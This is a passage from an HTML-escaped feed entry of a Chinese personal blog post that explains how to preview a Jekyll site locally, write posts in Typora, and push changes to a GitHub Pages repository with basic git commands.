&lt;p&gt;然后将生成的所有内容复制到自己目录下&lt;/p&gt;

&lt;p&gt;如果之前仓库有自己的内容，比如&lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt;里的静态页面或者&lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt;的内容，需要修改后再替换&lt;/p&gt;

&lt;p&gt;在自己的仓库目录下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ bundle exec jekyll serve
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;显示&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Configuration file: xxxx/sueisok.github.io/_config.yml
            Source: xxxx/sueisok.github.io
       Destination: xxxx/sueisok.github.io/_site
 Incremental build: disabled. Enable with --incremental
      Generating...
       Jekyll Feed: Generating feed for posts
                    done in 2.183 seconds.
 Auto-regeneration: enabled for 'xxxx/sueisok.github.io'
  JekyllAdmin mode: production
    Server address: http://127.0.0.1:4000
  Server running... press ctrl-c to stop.
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;即可访问本地&lt;code class=&quot;highlighter-rouge&quot;&gt;http://127.0.0.1:4000&lt;/code&gt;查看页面，直到自己满意了之后再提交到github上&lt;/p&gt;

&lt;h3 id=&quot;用typora写一篇内容&quot;&gt;用Typora写一篇内容&lt;/h3&gt;

&lt;p&gt;Typora是可以写markdown格式内容的编辑器，简约大方又不失便捷，还可以直接添加emoji表情，下次试一下&lt;/p&gt;

&lt;p&gt;写完直接丢到仓库的&lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt;里面&lt;/p&gt;

&lt;h3 id=&quot;将修改内容提交到github&quot;&gt;将修改内容提交到github&lt;/h3&gt;

&lt;p&gt;可以下载&lt;a href=&quot;https://desktop.github.com/&quot;&gt;GitHub Desktop&lt;/a&gt;，比较直观&lt;/p&gt;

&lt;p&gt;也可以手动提交到git，我这里目前只有一个master分支，操作也比较暴力因为只有我一个人维护，如果需要其他分支可自行百度&lt;/p&gt;

&lt;p&gt;查看修改内容：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git status
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将要提交的文件的信息添加到索引库&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git add .
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;添加此次修改的备注&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git commit -m &quot;xxxx&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;提交到master分支&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git push origin master
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;网络差的话可能提交失败，再试一下就好了（〃｀ 3′〃）&lt;/p&gt;

&lt;p&gt;然后稍等一下就可以看到自己的commit成功，在等一下就可以看到自己的文章更新好了，奥里给！&lt;/p&gt;</content><author><name>true</name></author><category term="jekyll" /><category term="github" /><summary type="html">0x00 拥有github 为什么用github： (￣▽￣)”方便不要钱，没有别的</summary></entry></feed>